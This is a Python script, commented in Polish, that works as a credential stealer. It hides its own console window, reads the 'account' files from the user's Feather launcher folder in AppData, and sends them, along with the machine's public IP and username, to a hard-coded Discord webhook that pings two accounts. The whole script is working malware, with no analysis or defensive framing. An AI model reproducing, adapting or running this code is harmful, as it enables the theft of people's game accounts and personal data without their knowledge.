import os
import requests
import socket
import getpass
import sys

# Ukryj okno konsoli
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

WEBHOOK_URL = "https://discord.com/api/webhooks/1425448665178312785/sfOMf3S17FDzFGHWACXSOrQF1ZAuV7nx1xjTK3iWkWrxF33lQG1_9EbEMQCxNqDwLyHM"

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def send_to_discord(message, files=None):
    try:
        if files:
            requests.post(WEBHOOK_URL, files=files)
        else:
            data = {"content": message}
            requests.post(WEBHOOK_URL, json=data)
        return True
    except:
        return False

def main():
    username = getpass.getuser()
    feather_path = f"C:\\Users\\{username}\\AppData\\Roaming\\.feather"
    
    if not os.path.exists(feather_path):
        return
    
    files_to_send = {}
    
    # Szukaj plików
    for file_name in ["account", "account2"]:
        file_path = os.path.join(feather_path, file_name)
        if os.path.exists(file_path):
            files_to_send[file_name] = file_path
        else:
            txt_path = file_path + ".txt"
            if os.path.exists(txt_path):
                files_to_send[file_name] = txt_path
    
    if not files_to_send:
        return
    
    # Wyślij dane
    ip = get_ip()
    message = f"<@929061521147981914> <@1198557818454810696>\n📁 Feather Files\n🌐 IP: {ip}\n👤 {username}"
    send_to_discord(message)
    
    # Wyślij pliki
    discord_files = {}
    for name, path in files_to_send.items():
        try:
            with open(path, 'rb') as f:
                file_content = f.read()
                discord_files[name] = (os.path.basename(path), file_content, 'text/plain')
        except:
            pass
    
    if discord_files:
        send_to_discord("Pliki:", files=discord_files)

if __name__ == "__main__":
    main()